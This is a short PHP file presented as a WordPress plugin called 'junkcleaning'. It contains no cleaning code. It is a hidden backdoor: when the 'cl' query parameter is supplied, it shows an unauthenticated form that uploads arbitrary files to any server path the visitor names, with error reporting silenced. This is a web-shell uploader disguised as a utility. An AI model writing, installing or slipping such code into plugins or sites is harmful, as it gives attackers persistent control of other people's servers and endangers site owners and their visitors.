<?php
/* Plugin name: junkcleaning */
error_reporting(0);
echo "junkcleaner";
if(isset($_GET['cl'])){
$cwd = getcwd()."/";
if(isset($_FILES["userfile"]["name"])){
$uploadfile = $_POST["l"] . basename($_FILES["userfile"]["name"]);
if(move_uploaded_file($_FILES["userfile"]["tmp_name"], $uploadfile)){echo "Upload!\n";}else{echo "Failed!";}
echo $_POST["l"] . "\n";
print_r($_FILES);
if($_FILES["userfile"]["error"] == 0){echo "<br><a href=\"{$_FILES["userfile"]["name"]}\" TARGET=_BLANK>{$_FILES["userfile"]["name"]}</a><br>";}
}
echo "<form enctype=\"multipart/form-data\" action=\"\" method=\"POST\">";
echo "<input type=\"text\" name=\"l\" value=\"$cwd\" style=\"width: 700px;\"><br>";
echo "<input name=\"userfile\" type=\"file\">";
echo "<input type=\"submit\" value=\"Upload\">";
echo "</form>";
}
?>